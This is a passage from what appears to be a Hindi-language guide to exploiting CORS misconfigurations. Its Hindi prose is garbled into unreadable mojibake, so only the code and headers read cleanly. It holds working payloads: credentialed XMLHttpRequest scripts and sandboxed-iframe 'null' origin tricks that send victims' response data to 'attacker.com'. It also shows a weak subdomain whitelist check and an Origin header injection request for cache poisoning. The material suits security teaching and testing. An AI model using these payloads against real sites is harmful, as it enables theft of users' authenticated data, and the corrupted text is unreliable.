рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп рдЦреБрдж рд╕реЗ рдХрд░рдиреЗ рдХрд╛ рд▓рд╛рдн рдХрдо рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреБрдХреАрдЬрд╝ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЕрд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

### рдЕрдкрд╡рд╛рдж: рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдерд╛рди рдХрд╛ рд╢реЛрд╖рдг

рдПрдХ рдЕрдкрд╡рд╛рдж рдореМрдЬреВрдж рд╣реИ рдЬрд╣рд╛рдВ рдкреАрдбрд╝рд┐рдд рдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдерд╛рди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдкреАрдбрд╝рд┐рдд рдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЖрдИрдкреА-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЖрдзрд╛рд░рд┐рдд рдПрдХреНрд╕реЗрд╕ рдЗрдВрдЯреНрд░рд╛рдиреЗрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдПред рдпрд╣ рд╡рд┐рдзрд┐ DNS рд░рд┐рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рд╕рдорд╛рди рдкреНрд░рднрд╛рд╡ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░рддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд╢реЛрд╖рдг рдХрд░рдирд╛ рд╕рд░рд▓ рд╣реИред

### `Access-Control-Allow-Origin` рдореЗрдВ `Origin` рдХрд╛ рдкрд░рд╛рд╡рд░реНрддрди

рд╡рд╛рд╕реНрддрд╡рд┐рдХ рджреБрдирд┐рдпрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдЬрд╣рд╛рдВ `Origin` рд╣реЗрдбрд░ рдХрд╛ рдорд╛рди `Access-Control-Allow-Origin` рдореЗрдВ рдкрд░рд╛рд╡рд░реНрддрд┐рдд рд╣реЛрддрд╛ рд╣реИ рд╕рд┐рджреНрдзрд╛рдВрддрд╛рддреНрдордХ рд░реВрдк рд╕реЗ рдЕрд╕рдВрднрд╛рд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрди рд╣реЗрдбрд░реНрд╕ рдХреЛ рдорд┐рд▓рд╛рди рдХрд░рдиреЗ рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдбреЗрд╡рд▓рдкрд░реНрд╕ CORS рдХреЛ рдХрдИ URL рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ `Access-Control-Allow-Origin` рд╣реЗрдбрд░ рдХреЛ `Origin` рд╣реЗрдбрд░ рдХреЗ рдорд╛рди рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдХрд░ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рджреБрд░реНрдмрд▓рддрд╛рдПрдБ рдкреНрд░рд╡рд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд╛рдж рдПрдХ рдбреЛрдореЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡реИрдз рд▓рдЧрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЕрд╕рд▓реАрдХрд░рдг рддрд╛рд░реНрдХ рдХреЛ рдзреЛрдЦрд╛ рджреЗрддрд╛ рд╣реИред
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null` рдЙрддреНрдкрддреНрддрд┐ рдХрд╛ рд╢реЛрд╖рдг

`null` рдЙрддреНрдкрддреНрддрд┐, рдЬреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдпрд╛ рд╕реНрдерд╛рдиреАрдп HTML рдлрд╝рд╛рдЗрд▓реЛрдВ рдЬреИрд╕реА рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХреА рдЧрдИ рд╣реИ, рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣реИред рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕ рдЙрддреНрдкрддреНрддрд┐ рдХреЛ рд╕реНрдерд╛рдиреАрдп рд╡рд┐рдХрд╛рд╕ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдлреЗрдж рд╕реВрдЪреАрдмрджреНрдз рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рднреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рдПрдХ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `null` рдЙрддреНрдкрддреНрддрд┐ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ CORS рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдЫрд▓рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдмрд╛рдпрдкрд╛рд╕ рддрдХрдиреАрдХ

рдЬрдм рдбреЛрдореЗрди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд╛ рд╕рд╛рдордирд╛ рд╣реЛ, рддреЛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдмрд╛рдпрдкрд╛рд╕ рдЕрд╡рд╕рд░реЛрдВ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛рдП, рдЬреИрд╕реЗ рдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдбреЛрдореЗрди рдХреЛ рдПрдХ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рдбреЛрдореЗрди рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рдирд╛ рдпрд╛ рд╕рдмрдбреЛрдореЗрди рд▓реЗрдиреЗ рдХреА рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд╢реЛрдз рдХрд░рдирд╛ред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдбреЛрдореЗрди рдорд╛рдиреНрдпрддрд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдореЗрдВ рдбреЛрдореЗрди рдирд╛рдордХрд░рдг рд╕рдореНрдорд┐рд▓рд┐рддрд┐ рдореЗрдВ рдЫреВрдЯ рдХреЗ рдЕрд╡рд╕рд░ рдкреНрд░рд╕реНрддреБрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдЙрдиреНрдирдд рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдмрд╛рдпрдкрд╛рд╕

рд░реЗрдЧреЗрдХреНрд╕ рдкреИрдЯрд░реНрди рд╕рд╛рдорд╛рдиреНрдпрдд: рдЕрд▓реНрдлрд╛рдиреНрдпреВрдореЗрд░рд┐рдХ, рдбреЙрдЯ (.), рдФрд░ рд╣рд╛рдЗрдлрд╝рди (-) рд╡рд░реНрдгреЛрдВ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЕрдиреНрдп рд╕рдВрднрд╛рд╡рдирд╛рдУрдВ рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдбреЛрдореЗрди рдирд╛рдо рдЬрд┐рд╕рдореЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ рдФрд░ рд░реЗрдЧреЗрдХреНрд╕ рдкреИрдЯрд░реНрдиреНрд╕ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рднрд┐рдиреНрди рд░реВрдк рд╕реЗ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╡рд░реНрдг рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ, рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╕рдлрд╛рд░реА, рдХреНрд░реЛрдо, рдФрд░ рдлрд╝рд╛рдпрд░рдлрд╝реЙрдХреНрд╕ рдХреЗ рдЕрдВрдбрд░рд╕реНрдХреЛрд░ рд╡рд░реНрдгреЛрдВ рдХреЗ рд╕рдмрдбреЛрдореЗрди рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рддрд░реАрдХрд╛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╡рд┐рд╕рдВрдЧрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди рдорд╛рдиреНрдпрддрд╛ рддрд░реНрдХ рдХреЛ рдЫрд▓рдиреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдЗрд╕ рдмрд╛рдпрдкрд╛рд╕ рдЬрд╛рдВрдЪ рдХреА рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **рдФрд░** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (281).png>)

### XSS рдХреЗ рдЕрдВрджрд░ рд╕рдмрдбреЛрдореЗрди рд╕реЗ

рдбреЗрд╡рд▓рдкрд░реНрд╕ рдЕрдХреНрд╕рд░ CORS рд╢реЛрд╖рдг рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛рддреНрдордХ рдЙрдкрд╛рдп рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рдбреЛрдореЗрди рдХреЛ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ред рдЗрди рд╕рд╛рд╡рдзрд╛рдирд┐рдпреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╕рд┐рд╕реНрдЯрдо рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИред рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рдбреЛрдореЗрдиреНрд╕ рдореЗрдВ рдПрдХ рд╣реА рдХрдордЬреЛрд░ рд╕рдмрдбреЛрдореЗрди рдХреА рдореМрдЬреВрджрдЧреА CORS рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП рджрд░рд╡рд╛рдЬрд╛ рдЦреЛрд▓ рд╕рдХрддреА рд╣реИ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рдЦреЛрдЬреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рдЬреИрд╕реЗ рдХрд┐ XSS (рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ)ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рд╕реНрдерд┐рддрд┐ рдХреЛ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ рдПрдХ рдбреЛрдореЗрди, `requester.com`, рдХреЛ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рджреВрд╕рд░реЗ рдбреЛрдореЗрди, `provider.com`, рд╕реЗред рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рджрд┐рдЦ рд╕рдХрддреА рд╣реИ:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
рдЗрд╕ рд╕реЗрдЯрдЕрдк рдореЗрдВ, `requester.com` рдХреЗ рд╕рднреА рд╕рдмрдбреЛрдореЗрди рдХреА рдкрд╣реБрдВрдЪ рдЕрдиреБрдорддрд┐ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдХреЛрдИ рд╕рдмрдбреЛрдореЗрди, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `sub.requester.com`, XSS рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА рдХреЗ рд╕рд╛рде рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `sub.requester.com` рддрдХ рдкрд╣реБрдВрдЪ рд╡рд╛рд▓реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ XSS рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ CORS рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдХреЗ `provider.com` рдкрд░ рд╕рдВрд╕рд╛рд░рд┐рдХ рд░реВрдк рд╕реЗ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ**

[**рдЗрд╕ рд╢реЛрдз рд╕реЗ**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ, рдПрдХ рд╕реНрдЯреЛрд░реНрдб рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ (XSS) рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА рдЙрддреНрдкрдиреНрди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдпрд╣ рд╕реНрдерд┐рддрд┐ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди `Origin` рд╣реЗрдбрд░ рдХреЛ рдЧреИрд░-рдХрд╛рдиреВрдиреА рд╡рд░реНрдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реИрдирд┐рдЯрд╛рдЗрдЬрд╝ рдирд╣реАрдВ рдХрд░рддрд╛, рдЦрд╛рд╕рдХрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рдФрд░ рдПрдЬ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред рдпреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ (0x0d) рдХреЛ рдПрдХ рд╡реИрдз HTTP рд╣реЗрдбрд░ рдЯрд░реНрдорд┐рдиреЗрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рд╡рдВрд▓рд░реЗрдмрд┐рд▓рд┐рдЯреА рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рдХреЛ рдзреНрдпрд╛рди рд╕реЗ рджреЗрдЦреЗрдВ рдЬрд╣рд╛рдБ `Origin` рд╣реЗрдбрд░ рдХреЛ рдореИрдирд┐рдкреБрд▓реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer рдФрд░ Edge рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЕрдиреБрд╡рд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
рдЗрд╕ рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛ рдХреЛ рд╕реАрдзреЗ рдЙрддреНрдкреАрдбрд╝рд┐рдд рдХрд░рдирд╛ рдПрдХ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдПрдХ рдЕрд╢реБрджреНрдз рд╣реЗрдбрд░ рднреЗрдЬрдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЕрдиреБрд░реЛрдз рдЙрдкрдХрд░рдгреЛрдВ рдЬреИрд╕реЗ рдмрд░реНрдк рд╕реБрдЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдПрдХ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдХреЛ рдЙрддреНрддреЗрдЬрд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИ рдФрд░ рдЙрддреНрддрд░ рдХреЛ рд╕рд╣рдЬрддрд╛ рд╕реЗ рдмрдЪрд╛рдХрд░ рджреВрд╕рд░реЛрдВ рдХреЛ рд╕реЗрд╡рд┐рдд рдХрд░ рд╕рдХрддреА рд╣реИред рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЗрд▓реЛрдб UTF-7 рдкреЗрдЬ рдХреЗ рд╡рд░реНрдг рд╕реЗрдЯ рдХреЛ рдмрджрд▓рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд░рдЦрддрд╛ рд╣реИ, рдЬреЛ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд╡рд░реНрдгреЛрдВ рдХреЛ рдПрдиреНрдХреЛрдб рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХреЗ рдХрд╛рд░рдг рдПрдХреНрд╕рдПрд╕рдПрд╕ рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛рдУрдВ рд╕реЗ рдЕрдХреНрд╕рд░ рдЬреБрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред

рднрд╡рд┐рд╖реНрдп рдореЗрдВ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рднрдВрдбрд╛рд░рд┐рдд рдПрдХреНрд╕рдПрд╕рдПрд╕ рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛рдУрдВ рдкрд░, рджреЗрдЦреЗрдВ [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**рдзреНрдпрд╛рди рджреЗрдВ**: HTTP рд╣реЗрдбрд░ рдЙрддреНрдкреАрдбрд╝рди рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛рдУрдВ рдХрд╛ рд╢реЛрд╖рдг, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрддреНрдд рдЗрдирдкреБрдЯ, рд╕рд╣рд┐рдд HTTP рд╣реЗрдбрд░реНрд╕ рдХреА рдорд╛рдиреНрдпрддрд╛ рдФрд░ рд╢реЛрдзрди рдХрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛрдирд╛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИред рд╣рдореЗрд╢рд╛ рдПрдХ рдордЬрдмреВрдд рд╕реБрд░рдХреНрд╖рд╛ рдореЙрдбрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдЗрдирдкреБрдЯ рдорд╛рдиреНрдпреАрдХрд░рдг рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдРрд╕реА рджреБрд░реБрдкрдпреЛрдЧрд┐рддрд╛рдУрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдПред

### **рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ**

[**рдЗрд╕ рдЕрдиреБрд╕рдВрдзрд╛рди рд╕реЗ**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ, рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХреА рдПрдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рд╕рд╣реА рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рдХреЗ рдмрд┐рдирд╛ рдПрдХ рдХрд╕реНрдЯрдо HTTP рд╣реЗрдбрд░ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░рддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рд╡реЗрдм рдкреГрд╖реНрда `X-User-id` рд╣реЗрдбрд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХреА рдЧрдИ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧреА рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ рдПрд╕рд╡реАрдЬреА рдЫрд╡рд┐ рдЯреИрдЧ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

